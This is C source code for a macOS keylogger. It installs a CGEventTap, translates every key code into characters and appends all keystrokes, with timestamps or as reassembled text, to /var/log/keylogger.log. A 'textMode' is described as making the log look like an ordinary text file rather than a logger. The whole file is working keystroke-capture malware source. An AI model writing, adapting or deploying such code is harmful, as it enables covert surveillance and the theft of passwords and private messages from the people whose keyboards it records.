#include "keylogger.h"
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <time.h>

#define PATH "/var/log/keylogger.log"

// The following method converts the key code returned by each keypress as
// a human readable key code in const char format.
char * keyToString (CGKeyCode keyCode) {
    char *key;

    key = "<unknown>";

    switch ((int) keyCode) {
      case   0:
            key = (caps | shift) ? "A" : "a";
            break;
      case   1:
            key = (caps | shift) ? "S" : "s";
            break;
      case   2:
            key = (caps | shift) ? "D" : "d";
            break;
      case   3:
            key = (caps | shift) ? "F" : "f";
            break;
      case   4:
            key = (caps | shift) ? "H" : "h";
            break;
      case   5:
            key = (caps | shift) ? "G" : "g";
            break;
      case   6:
            key = (caps | shift) ? "Z" : "z";
            break;
      case   7:
            key = (caps | shift) ? "X" : "x";
            break;
      case   8:
            key = (caps | shift) ? "C" : "c";
            break;
      case   9:
            key = (caps | shift) ? "V" : "v";
            break;
      case  11:
            key = (caps | shift) ? "B" : "b";
            break;
      case  12:
            key = (caps | shift) ? "Q" : "q";
            break;
      case  13:
            key = (caps | shift) ? "W" : "w";
            break;
      case  14:
            key = (caps | shift) ? "E" : "e";
            break;
      case  15:
            key = (caps | shift) ? "R" : "r";
            break;
      case  16:
            key = (caps | shift) ? "Y" : "y";
            break;
      case  17:
            key = (caps | shift) ? "T" : "t";
            break;
      case  18:
            key = (caps | shift) ? "!" : "1";
            break;
      case  19:
            key = (caps | shift) ? "@" : "2";
            break;
      case  20:
            key = (caps | shift) ? "#" : "3";
            break;
      case  21:
            key = (caps | shift) ? "$" : "4";
            break;
      case  22:
            key = (caps | shift) ? "^" : "6";
            break;
      case  23:
            key = (caps | shift) ? "%" : "5";
            break;
      case  24:
            key = (caps | shift) ? "+" : "=";
            break;
      case  25:
            key = (caps | shift) ? "(" : "9";
            break;
      case  26:
            key = (caps | shift) ? "&" : "7";
            break;
      case  27:
            key = (caps | shift) ? "–" : "-";
            break;
      case  28:
            key = (caps | shift) ? "*" : "8";
            break;
      case  29:
            key = (caps | shift) ? ")" : "0";
            break;
      case  30:
            key = (caps | shift) ? "}" : "]";
            break;
      case  31:
            key = (caps | shift) ? "O" : "o";
            break;
      case  32:
            key = (caps | shift) ? "U" : "u";
            break;
      case  33:
            key = (caps | shift) ? "{" : "[";
            break;
      case  34:
            key = (caps | shift) ? "I" : "i";
            break;
      case  35:
            key = (caps | shift) ? "P" : "p";
            break;
      case  36:
            if (textMode) {
                complete = true;
            }
            return textMode ? "\n" : "<return>";
      case  37:
            key = (caps | shift) ? "L" : "l";
            break;
      case  38:
            key = (caps | shift) ? "J" : "j";
            break;
      case  39:
            if (textMode) {
                complete = true;
            }
            key = (caps | shift) ? "?" : "\'";
            break;
      case  40:
            key = (caps | shift) ? "K" : "k";
            break;
      case  41:
            key = (caps | shift) ? ":" : ";";
            break;
      case  42:
            key = (caps | shift) ? "|" : "\\";
            break;
      case  43:
            key = (caps | shift) ? "<" : ",";
            break;
      case  44:
            key = (caps | shift) ? "?" : "/";
            break;
      case  45:
            key = (caps | shift) ? "N" : "n";
            break;
      case  46:
            key = (caps | shift) ? "M" : "m";
            break;
      case  47:
            if (textMode) {
                complete = true;
            }
            key = (caps | shift) ? ">" : ".";
            break;
      case  48:
            if (textMode) {
                complete = true;
            }
            return textMode ? "\t" : "<tab>";
      case  49:
            if (textMode) {
                //complete = true;
            }
            return textMode ? " " : "<space>";
      case  50:
            key = (caps | shift) ? "~" : "`";
            break;
      case  51:
            if (textMode) {
                complete = true;
                return "<del>";
            }else{
                return "<delete>";
            }
      case  53: return "<escape>";
      case  55:
            if (textMode) {
                cmd = !cmd;
                complete = true;
                return "<command>";
            }else{
                return "<command>";
            }
      case  56:
            if (textMode) {
                shift = !shift;
                return "";
            }else{
                return "<shift>";
            }
      case  57:
            if (textMode) {
                caps = !caps;
                return "";
            }else{
                return "<capslock>";
            }
      case  58:
            if (textMode) {
                option = !option;
                return "<Option>";
            }else{
                return "<Option>";
            }
      case  59:
            if (textMode) {
                ctrl = !ctrl;
                return "";
            }else{
                return "<Control>";
            }
      case  60:
            if (textMode) {
                shift = !shift;
                return "";
            }else{
                return "<Right Shift>";
            }
      case  61:
            if (textMode) {
                option = !option;
                if (option) {
                    return "<Option>";
                }else{
                    return "";
                }
            }else{
                return "<Option>";
            }
      case  62:
            if (textMode) {
                ctrl = !ctrl;
                return "";
            }else{
                return "<Right Control>";
            }
      case  63: return "<Function>";
      case  64: return "<F17>";
      case  72: return "<Volume Up>";
      case  73: return "<Volume Down>";
      case  74: return "<mute>";
      case  79: return "<F18>";
      case  80: return "<F19>";
      case  90: return "<F20>";
      case  96: return "<F5>";
      case  97: return "<F6>";
      case  98: return "<F7>";
      case  99: return "<F3>";
      case 100: return "<F8>";
      case 101: return "<F9>";
      case 103: return "<F11>";
      case 105: return "<F13>";
      case 106: return "<F16>";
      case 107: return "<F14>";
      case 109: return "<F10>";
      case 111: return "<F12>";
      case 113: return "<F15>";
      case 116: return "Page Up";
      case 118: return "<F4>";
      case 119: return "<End>";
      case 120: return "<F2>";
      case 121: return "<Page Down>";
      case 122: return "<F1>";
      case 123: return "<Left>";
      case 124: return "<Right>";
      case 125: return "<Down>";
      case 126: return "<Up>";
      default: return "<unknown>";
    }

    return key;
}

/* This callback will be invoked every time there is a keystroke. */
CGEventRef keyboardCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    // Sanity check
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) {
        return event;
    }

    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // textMode tries to print out like a normal text file instead of looking like a logger
    if (textMode) {
        // Append key to file
        char *keyString = keyToString(keyCode);

        // adds all keystrokes to a buffer until it becomes a complete segment
        for(int i = 0; i < strlen(keyString); i++){
          buffer[bufferFree] = keyString[i];
          bufferFree = bufferFree + 1;
        }

        // once a complete word or segment is found, prints and reset buffer
        if(complete == true || bufferFree >= (sizeof buffer)-10){
          fprintf(logfile, "%s", buffer);
          complete = false;
          memset(&buffer[0], 0, sizeof(buffer)); //clears buffer
          bufferFree = 0;

        }
    //loggerMode
    }else{

        // Time Stuff
        time_t timer;
        char buffer[26];
        struct tm* tm_info;

        time(&timer);
        tm_info = localtime(&timer);

        strftime(buffer, 26, "%Y-%m-%d %H:%M:%S", tm_info);

        // Append Time + key to file
        fprintf(logfile, "%s %s \n", buffer, keyToString(keyCode));
    }

    fflush(logfile);
    return event;
}


int main(int argc, const char *argv[]) {

    /* EVENTS SETUP */

    // We are interested in key presses.
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
    // Create an event tap to retrieve keypresses
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, keyboardCallback, NULL);

    // Exit the program if unable to create the event tap.
    if(!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Creates a CFRunLoopSource object for a CFMachPort object and enable event tap
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    // Get the current time and open the logfile.
    time_t result = time(NULL);
    logfile = fopen(PATH, "a");

    if (!logfile) {
        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
        exit(1);
    }

    // Output to logfile.
    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
    fflush(logfile);

    // Display the location of the logfile and start the loop.
    printf("Logging to: %s\n", PATH);
    fflush(stdout);

    // Runs the current thread’s CFRunLoop object in its default mode indefinitely.
    CFRunLoopRun();

    return 0;
}